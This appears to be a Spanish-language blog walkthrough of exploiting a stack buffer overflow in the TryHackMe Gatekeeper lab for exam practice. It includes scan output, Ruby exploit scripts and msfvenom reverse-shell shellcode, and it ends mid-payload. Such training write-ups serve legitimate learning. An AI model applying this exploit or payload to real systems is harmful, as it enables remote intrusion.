---
layout: post
title:  "[eCPPT Style] - Buffer overflow Gatekeeper.rb"
date:   2021-10-16 09:29:20 +0700
categories: jekyll update
---
<figure>
<img src="/assets/img/Gatekeeper.png" alt="Gatekeeper">
</figure>

Este walkthrough muestra el paso a paso para explotar una vulnerabilidad de tipo stack buffer overflow utilizando un laboratorio de tryhackme (Gatekeeper) como objetivo. Ejercicio practico de simulacion para el examen de OSCP o eCPTT.

Conectar VPN de Tryhackme `sudo openvpn 5pok.ovpn` y realizar un ping a la maquina vulnerable `ping -c 1 10.10.8.78`

Segun TheCyberMentor, existen 7 pasos para realizar un boffer overflow con exito, estos son:
- A.- Recon ⛏️
- B.- Fuzzing 💥
- C.- Offset 📴
- D.- EIP 📦❓
- E.- Bad Characters 😈
- F.- Module 🔌
- G.- Shellcode 🍳🥚

A.- Recon: Utilizar [Rustscan][rustscan] para empezar la fase de recon.

`rustscan -b 500 -a 10.10.12.103 --ulimit 5000 -- -sC -sV` 

El resultado del scaneo es el siguiente:

{% highlight bash %}
└─$ rustscan -b 500 -a 10.10.12.103 -- -sC -sV                                                                   1 ⨯
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/spok/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.12.103:135
Open 10.10.12.103:139
Open 10.10.12.103:445
Open 10.10.12.103:3389
Open 10.10.12.103:31337
Open 10.10.12.103:49152
Open 10.10.12.103:49153
Open 10.10.12.103:49154
Open 10.10.12.103:49155
Open 10.10.12.103:49165
Open 10.10.12.103:49161
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 22:05 -03
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:05
Completed NSE at 22:05, 0.00s elapsed
Initiating Ping Scan at 22:05
Scanning 10.10.12.103 [2 ports]
Completed Ping Scan at 22:05, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:05
Completed Parallel DNS resolution of 1 host. at 22:05, 0.14s elapsed
DNS resolution of 1 IPs took 0.14s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:05
Scanning 10.10.12.103 [11 ports]
Discovered open port 3389/tcp on 10.10.12.103
Discovered open port 445/tcp on 10.10.12.103
Discovered open port 139/tcp on 10.10.12.103
Discovered open port 135/tcp on 10.10.12.103 
Discovered open port 49165/tcp on 10.10.12.103
Discovered open port 49152/tcp on 10.10.12.103
Discovered open port 49153/tcp on 10.10.12.103
Discovered open port 49154/tcp on 10.10.12.103
Discovered open port 49161/tcp on 10.10.12.103
Discovered open port 49155/tcp on 10.10.12.103
Discovered open port 31337/tcp on 10.10.12.103
Completed Connect Scan at 22:05, 0.46s elapsed (11 total ports)
Initiating Service scan at 22:05
Scanning 11 services on 10.10.12.103
Service scan Timing: About 45.45% done; ETC: 22:07 (0:01:08 remaining)
Completed Service scan at 22:06, 84.06s elapsed (11 services on 1 host)
NSE: Script scanning 10.10.12.103.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:06
NSE Timing: About 99.60% done; ETC: 22:07 (0:00:00 remaining)
NSE Timing: About 99.80% done; ETC: 22:07 (0:00:00 remaining)
NSE Timing: About 99.87% done; ETC: 22:08 (0:00:00 remaining)
NSE Timing: About 99.93% done; ETC: 22:08 (0:00:00 remaining)
Completed NSE at 22:09, 141.41s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:09
Completed NSE at 22:09, 1.29s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:09
Completed NSE at 22:09, 0.00s elapsed
Nmap scan report for 10.10.12.103
Host is up, received conn-refused (0.23s latency).
Scanned at 2021-11-07 22:05:33 -03 for 227s

PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=gatekeeper
| Issuer: commonName=gatekeeper
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-11-07T00:53:55
| Not valid after:  2022-05-09T00:53:55
| MD5:   b82b 2921 192a f1bb 664a c284 6631 bdeb
| SHA-1: 47c2 f14b 02e0 71ce 7cfe 323d e020 ecc6 8e1e 8665
| -----BEGIN CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIQGMuOowXNB4tBNLEJ0VrbfDANBgkqhkiG9w0BAQUFADAV
| MRMwEQYDVQQDEwpnYXRla2VlcGVyMB4XDTIxMTEwNzAwNTM1NVoXDTIyMDUwOTAw
| NTM1NVowFTETMBEGA1UEAxMKZ2F0ZWtlZXBlcjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBANmdZ/cTmHUcgDIGK3lEAGmAuCONOUYnBeoHCAb26Wxn1DN0
| c5T47cR9T7Bp9TUWYLKNj881zJahgp8ql8ATfLmXjHneLpvntm6ouqDUff9Loy+i
| dHXBd/E/H0ME8rpXJzPOacQqPrwiiF55ZFLAb/pKLW+dEwL0b6+3p0qAiRyvFgZZ
| 68csca4sBWzPJA4oLYnAHnDAK/Pe4n4mPwC3pE6M4SH+z6MtEQxnpvfEi3K2puoI
| hC9f+PDAKdd0CrlOSlKBlNZo7CjCufQGIttV3kjNNeLAtXdhWRJyuTF0NPd9wX1D
| ucttfXNREemR8CGH5NGMaP0OHBiKhSAwHGBkJWMCAwEAAaMkMCIwEwYDVR0lBAww
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQC1XYt9
| RVFY1wLlN/9ToH2pLTpjawZGnqdlduC2kfNd+n7/CiJAyrpy6lqUei8WMHbXRLnZ
| 89GY2ZfsspCAsGn7o/fR+mwHAN/AHTXXbdWsDaUqyvSmALQgTbj6RjBq1CJUE2+/
| FSAPwOl05AFKphsqmr270FRzHIPTisMGzadHYRxuu471pquGNtDnTo+agGj1cp68
| Vv7Lwi100y2vNdujqA1B6/YUEy6bvapB1LSqxsnRKJFYF28EYCJXXZs8wF3Qve/0
| U/S4g4WH3rcv9m/d9pfmRwr3BsKY2XhgO31bVNCFAcO0MCXBXhndg5Szpr3kYMcd
| jspqgnvO3v7ljnIq
|_-----END CERTIFICATE-----
|_ssl-date: 2021-11-08T01:09:19+00:00; -1s from scanner time.
31337/tcp open  Elite?             syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49161/tcp open  msrpc              syn-ack Microsoft Windows RPC
49165/tcp open  msrpc              syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=11/7%Time=618877E9%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n");
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13098/tcp): CLEAN (Timeout)
|   Check 2 (port 50359/tcp): CLEAN (Timeout)
|   Check 3 (port 56514/udp): CLEAN (Timeout)
|   Check 4 (port 14113/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:09
Completed NSE at 22:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:09
Completed NSE at 22:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:09
Completed NSE at 22:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.89 seconds
{% endhighlight %}  

Ahora validar el servidor SMB con smbcliente. Para listar el contenido usaremos:

{% highlight bash %}
└─$ smbclient -L //10.10.12.103/ -N                                                                              1 ⨯

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
SMB1 disabled -- no workgroup available
{% endhighlight %} 

Luego descargar .exe vulnerable a buffer overflow desde SMB

{% highlight bash %}
└─$ smbclient -N //10.10.12.103/Users
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3973738 blocks available
smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

                7863807 blocks of size 4096. 3973738 blocks available
smb: \Share\> get gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (9,2 KiloBytes/sec) (average 9,2 KiloBytes/sec)
{% endhighlight %} 

En el caso de que aparezca un error (VCRUNTIME140.dll missing) al abrir el .exe en inmunity debugger, entonces tendras que instalar [Visual Studio C++ Redistributable Package for 32-bit][redisvstudio]

B.- Fuzzing: Mandar fuzzer para ver en donde se produce el bof.

Fuzzear manual con 1000 chars. Crashea a los 200 pero igual podemos utilizar un numero elevado para no perder el tiempo

{% highlight bash %}
└─$ nc -nv 10.10.231.226 31337                             
(UNKNOWN) [10.10.231.226] 31337 (?) open
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

{% endhighlight %} 

C.- Offset:

Para calcular el offset utilizaremos mona, con este comando podemos definir la carpeta por defecto

`!mona config -set workingfolder c:\mona\%p`

Luego crear un pattern con mona de 1000 caracteres

`!mona pattern_create 1000`

ir a C:mona y abrir txt con pattern, copiar y pegar en nuestro host atacante utilizando nc para abrir una conexion al p:31337

{% highlight bash %}
└─$ nc -nv  10.0.69.5 31337
(UNKNOWN) [10.0.69.5] 31337 (?) open
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
{% endhighlight %} 

Luego en inmmunity debugger calculamos el Offset, basado en el registro EIP 39654138

`!mona findmsp -distance 1000`

<figure>
<img src="/assets/img/finddistance.png" alt="finddistance">
</figure> 

En este caso es 146 el numero de caracteres necesarios para crashear el programa. Con esta info. podemos comenzar a escribir el codigo. En este caso usaremos el lenguaje de programacion Ruby

{% highlight ruby %}
buff = "\x90"*146        #Aqui agregar valor del offset 146
#buff+= ""              #jmp esp
buff+= "B"*10           #Argumentos adicionales
#buff+=
#Shellcode

require 'socket'

TCPSocket.open("10.0.69.5","31337") { |s| s.puts buff }
{% endhighlight %} 

D.- EIP:

Ahora ejecutaremos el codigo para ver si tenemos el control del registro EIP, en este caso deberia aparecer 42424242, este valor seria igual a BBBB en Hex.

{% highlight bash %}
┌──(spok㉿spok)-[~]
└─$ ruby bof.rb 
{% endhighlight %} 

<figure>
<img src="/assets/img/4242.png" alt="4242">
</figure>  

E.- Bad Characters:

Para validar los badchars, realizaremos el siguiente cambio en nuestro payload.

{% highlight ruby %}
buff = "\x90"*146        #Aqui agregar valor del offset 146
#buff+= ""              #jmp esp
buff+= "B"*10           #Argumentos adicionales
buff+= "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#Shellcode

require 'socket'

TCPSocket.open("10.0.69.5","31337") { |s| s.puts buff }
{% endhighlight %} 

Nota: el byte “\x00” siempre es nulo, pero en gatekeeper tambien podemos ver otro caracter nulo, es el “\x0a”, para identificarlo vamos al registro ESP y apretamos en follow in dump, este caracter aparece como 00 en la memoria, por eso debemos sacarlo al momento de generar el shellcode

<figure>
<img src="/assets/img/bad1.png" alt="bad1">
</figure>  

Entonces el payload sin el 2da bad character quedaria asi:

{% highlight ruby %}
buff = "\x90"*146        #Aqui agregar valor del offset 146
#buff+= ""              #jmp esp
buff+= "B"*10           #Argumentos adicionales
buff+= "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#Shellcode

require 'socket'

TCPSocket.open("10.0.69.5","31337") { |s| s.puts buff }
{% endhighlight %} 

Verificamos nuevamente que no existe algun 00 en la memoria, para luego pasar a la busqueda de un modulo JMP ESP.

F.- Module:

Ahora hay que buscar un modulo que permita saber la ubicacion del JMP ESP, especificando con el parametro -cpb los bad characters:

`!mona jmp -r esp -cpb "\x00\x0a"`

<figure>
<img src="/assets/img/module.png" alt="module">
</figure>   

La direccion de memoria 080414c3 pasarla a formato Little Endian:

\xc3\x14\x04\x08

Nuestro payload estaria casi listo, agregamos la direccion de memoria y quedaria de la siguiente manera:

{% highlight ruby %}
buff = "\x90"*146        #Aqui agregar valor del offset 146
buff+= "\xc3\x14\x04\x08"              #jmp esp
buff+= "B"*10           #Argumentos adicionales
#buff+=
#Shellcode

require 'socket'

TCPSocket.open("10.0.69.5","31337") { |s| s.puts buff }
{% endhighlight %} 


G.- Shellcode:

Con msfvenom generar el shellcode:

{% highlight bash %}
┌──(spok㉿spok)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.69.4 LPORT=1234 -b '\x00\x0a' EXITFUNC=thread -f rb  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of rb file: 1539 bytes
buf = 
"\xbe\x57\x18\xbc\x04\xdb\xdc\xd9\x74\x24\xf4\x5f\x29\xc9" +
"\xb1\x52\x31\x77\x12\x83\xc7\x04\x03\x20\x16\x5e\xf1\x32" +
"\xce\x1c\xfa\xca\x0f\x41\x72\x2f\x3e\x41\xe0\x24\x11\x71" +
"\x62\x68\x9e\xfa\x26\x98\x15\x8e\xee\xaf\x9e\x25\xc9\x9e" +
"\x1f\x15\x29\x81\xa3\x64\x7e\x61\x9d\xa6\x73\x60\xda\xdb" +
"\x7e\x30\xb3\x90\x2d\xa4\xb0\xed\xed\x4f\x8a\xe0\x75\xac" +
"\x5b\x02\x57\x63\xd7\x5d\x77\x82\x34\xd6\x3e\x9c\x59\xd3" +
"\x89\x17\xa9\xaf\x0b\xf1\xe3\x50\xa7\x3c\xcc\xa2\xb9\x79" +
"\xeb\x5c\xcc\x73\x0f\xe0\xd7\x40\x6d\x3e\x5d\x52\xd5\xb5" +
"\xc5\xbe\xe7\x1a\x93\x35\xeb\xd7\xd7\x11\xe8\xe6\x34\x2a" +
"\x14\x62\xbb\xfc\x9c\x30\x98\xd8\xc5\xe3\x81\x79\xa0\x42" +
"\xbd\x99\x0b\x3a\x1b\xd2\xa6\x2f\x16\xb9\xae\x9c\x1b\x41" +
"\x2f\x8b\x2c\x32\x1d\x14\x87\xdc\x2d\xdd\x01\x1b\x51\xf4" +
"\xf6\xb3\xac\xf7\x06\x9a\x6a\xa3\x56\xb4\x5b\xcc\x3c\x44" +
"\x63\x19\x92\x14\xcb\xf2\x53\xc4\xab\xa2\x3b\x0e\x24\x9c" +
"\x5c\x31\xee\xb5\xf7\xc8\x79\xb0\x07\x97\x7d\xac\x05\x17" +
"\x7a\xfe\x83\xf1\xe8\xee\xc5\xaa\x84\x97\x4f\x20\x34\x57" +
"\x5a\x4d\x76\xd3\x69\xb2\x39\x14\x07\xa0\xae\xd4\x52\x9a" +
"\x79\xea\x48\xb2\xe6\x79\x17\x42\x60\x62\x80\x15\x25\x54" +
"\xd9\xf3\xdb\xcf\x73\xe1\x21\x89\xbc\xa1\xfd\x6a\x42\x28" +
"\x73\xd6\x60\x3a\x4d\xd7\x2c\x6e\x01\x8e\xfa\xd8\xe7\x78" +
"\x4d\xb2\xb1\xd7\x07\x52\x47\x14\x98\x24\x48\x71\x6e\xc8" +
"\xf9\x2c\x37\xf7\x36\xb9\xbf\x80\x2a\x59\x3f\x5b\xef\x79" +
"\xa2\x49\x1a\x12\x7b\x18\xa7\x7f\x7c\xf7\xe4\x79\xff\xfd" +
"\x94\x7d\x1f\x74\x90\x3a\xa7\x65\xe8\x53\x42\x89\x5f\x53" +
"\x47"
{% endhighlight %} 

Luego reemplazamos en el payload, quedando asi:

{% highlight ruby %}
buff = "\x90"*146        #Aqui agregar valor del offset 146
buff+= "\xc3\x14\x04\x08"              #jmp esp
buff+= "B"*10           #Argumentos adicionales
buff+= "\xbe\x57\x18\xbc\x04\xdb\xdc\xd9\x74\x24\xf4\x5f\x29\xc9" +
"\xb1\x52\x31\x77\x12\x83\xc7\x04\x03\x20\x16\x5e\xf1\x32" +
"\xce\x1c\xfa\xca\x0f\x41\x72\x2f\x3e\x41\xe0\x24\x11\x71" +
"\x62\x68\x9e\xfa\x26\x98\x15\x8e\xee\xaf\x9e\x25\xc9\x9e" +
"\x1f\x15\x29\x81\xa3\x64\x7e\x61\x9d\xa6\x73\x60\xda\xdb" +
"\x7e\x30\xb3\x90\x2d\xa4\xb0\xed\xed\x4f\x8a\xe0\x75\xac" +
"\x5b\x02\x57\x63\xd7\x5d\x77\x82\x34\xd6\x3e\x9c\x59\xd3" +
"\x89\x17\xa9\xaf\x0b\xf1\xe3\x50\xa7\x3c\xcc\xa2\xb9\x79" +
"\xeb\x5c\xcc\x73\x0f\xe0\xd7\x40\x6d\x3e\x5d\x52\xd5\xb5" +
"\xc5\xbe\xe7\x1a\x93\x35\xeb\xd7\xd7\x11\xe8\xe6\x34\x2a" +
"\x14\x62\xbb\xfc\x9c\x30\x98\xd8\xc5\xe3\x81\x79\xa0\x42" +
"\xbd\x99\x0b\x3a\x1b\xd2\xa6\x2f\x16\xb9\xae\x9c\x1b\x41" +
"\x2f\x8b\x2c\x32\x1d\x14\x87\xdc\x2d\xdd\x01\x1b\x51\xf4" +
"\xf6\xb3\xac\xf7\x06\x9a\x6a\xa3\x56\xb4\x5b\xcc\x3c\x44" +
"\x63\x19\x92\x14\xcb\xf2\x53\xc4\xab\xa2\x3b\x0e\x24\x9c" +
"\x5c\x31\xee\xb5\xf7\xc8\x79\xb0\x07\x97\x7d\xac\x05\x17" +
"\x7a\xfe\x83\xf1\xe8\xee\xc5\xaa\x84\x97\x4f\x20\x34\x57" +
